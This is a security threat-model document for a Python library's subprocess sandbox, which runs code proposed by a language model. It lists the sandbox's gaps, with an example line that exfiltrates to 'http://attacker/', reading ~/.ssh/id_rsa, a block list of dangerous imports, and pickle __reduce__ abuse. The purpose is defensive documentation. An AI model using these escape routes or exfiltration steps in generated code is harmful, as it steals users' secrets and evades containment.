# Subprocess sandbox: threat model

This document describes, honestly, what the `SafetyConfig(sandbox="subprocess")` option actually protects against and what it does not. If you are running self-heal against untrusted inputs or proposals from an adversarial model, read this before deploying.

## Context

`self-heal` executes LLM-proposed Python source via `exec()`. By default that happens in the calling process, which is the standard trust boundary for any LLM-in-the-loop system. For stronger isolation there is an opt-in subprocess sandbox that runs each call to the repaired function in a fresh Python child process (`python -I`). Args and return values travel through pickle on stdin/stdout.

```python
from self_heal import repair, SafetyConfig

@repair(safety=SafetyConfig(level="moderate", sandbox="subprocess"))
def my_tool(...): ...
```

The AST safety rails (`level="moderate"` or `"strict"`) are an independent layer that runs before the sandbox. Combine them.

## What the subprocess sandbox DOES protect against

1. **Memory corruption of the parent's globals.** The child starts with a fresh `{"__name__": "__sandbox__"}` namespace. It cannot reach into the parent's module globals, variables, or imported modules. A proposal that mutates module-level state only mutates it in the ephemeral child.
2. **`sys.exit()` from proposals.** The child process exiting does not take down the parent.
3. **Infinite loops and hangs.** `SafetyConfig(sandbox_timeout=...)` kills the child after N seconds (default 30). Without the sandbox an infinite-loop proposal hangs the parent.
4. **Segfaults from proposed C-extension code.** A segfault kills the child, not the parent. The parent sees a `SandboxError` with the worker's exit code.
5. **`gc.get_referrers()` introspection** of parent-process objects. The child can only see objects that travel through pickle, not the parent's live object graph.
6. **Signal delivery to the parent.** The child runs under `python -I` with no signal handlers installed by self-heal; signals raised in proposed code cannot propagate.
7. **Custom exception class collisions.** Exception classes defined inside the proposal exist only in the child. If they are raised, self-heal surfaces them as `SandboxProposalError` with the preserved type name, message, and traceback, rather than corrupting the parent's exception namespace.

## What it DOES NOT protect against

1. **Network access.** The child has full network access. A proposal can `urllib.request.urlopen("http://attacker/")` and exfiltrate anything that travels through its args. If you need network isolation, run self-heal inside a container, firejail jail, gVisor sandbox, or Kubernetes Pod with a `NetworkPolicy` that denies egress.
2. **Filesystem reads and writes.** The child shares the parent's filesystem permissions. A proposal can read `~/.ssh/id_rsa` or any file the invoking user can read. If you care, run inside a filesystem-restricted container or use an OS-level sandbox (Docker read-only mounts, systemd `ProtectHome=`, AppArmor).
3. **Resource exhaustion.** The timeout is a wall-clock cap, but within that window a proposal can consume unlimited memory, CPU, or file descriptors. Use container limits or `resource.setrlimit` in a wrapper if you need bounds.
4. **Malicious imports the AST rails miss.** The AST layer blocks a curated list of dangerous imports (`subprocess`, `socket`, `pickle`, `ctypes`, etc.). It does not know about every dangerous standard library or third-party module. Strict mode is the tighter option but still whitelist-by-hand.
5. **Side channels.** Timing, CPU usage, pickle payload size — all observable to code running alongside on the same host.
6. **Picklable-exception abuse.** If the worker succeeds in pickling a real exception whose `__reduce__` is adversarial, `pickle.loads` on the parent side still runs that `__reduce__`. This is the standard pickle trust issue; the sandbox attack surface there is small because the args/return values in typical self-heal use are strings, numbers, and simple containers, but it exists.
7. **Supply-chain attacks via the proposer.** If your LLM provider is compromised or prompt-injected, the sandbox bounds the damage per proposal but does not prevent repeated attempts.

## Recommended defense layering

Pick the layer that matches your actual threat model. More layers is more cost.

| Threat | Use |
|---|---|
| Buggy proposals in trusted codebase | AST rails alone (`level="moderate"`) |
| Proposals against semi-trusted tests | AST rails + subprocess sandbox (this doc) |
| Network-exfiltration risk | Sandbox + Docker with `--network none` or a Kubernetes NetworkPolicy |
| Filesystem exfiltration risk | Sandbox + container with read-only mounts and no secret volumes |
| Adversarial prompt injection | All of the above + rate-limit retries + human-in-the-loop review on any accepted patch |
| Arbitrary-code-execution-adjacent threat model | Run self-heal behind a proper sandbox (gVisor, Firecracker microVM, WASI). v0.5 adds a wasm sandbox option; until then, wrap yourself. |

## Caveat about proposals needing imports

When the subprocess sandbox is active, the child has no inherited imports from the parent. Every import the proposal uses must appear inside the proposal's source. In practice the LLM usually includes them, but if you see `NameError: name 'math' is not defined` inside the sandbox, that is the proposal forgetting to `import math` at the top of its function. Add a `prompt_extra="Include all needed imports at the top of the function"` hint to the repair loop if this is frequent for your use case.

## Threat model open questions

- **Picklable-exception `__reduce__` abuse** (item 6 above). The worker currently uses `pickle.dumps(exc)` before sending, which triggers any `__reduce__` side effects on the worker side but not on the parent. Parent-side unpickling runs `__reduce__` on reconstruction. This is standard pickle behavior and the same class of risk as any pickle-over-IPC system. We do not attempt to isolate the parent's unpickle step; if this matters, run the parent in its own sandbox.
- **Warm worker pool** (issue #16). A long-lived worker reduces startup cost but introduces cross-call state leaks. When this lands, it will be a separate opt-in mode (`sandbox="subprocess_warm"`) so the current guarantees remain available.

## Reporting

If you find a way to escape the sandbox or subvert the AST rails, please file a **private** security advisory on GitHub (`Johin2/self-heal` → Security → Advisories → Report a vulnerability) rather than opening a public issue.
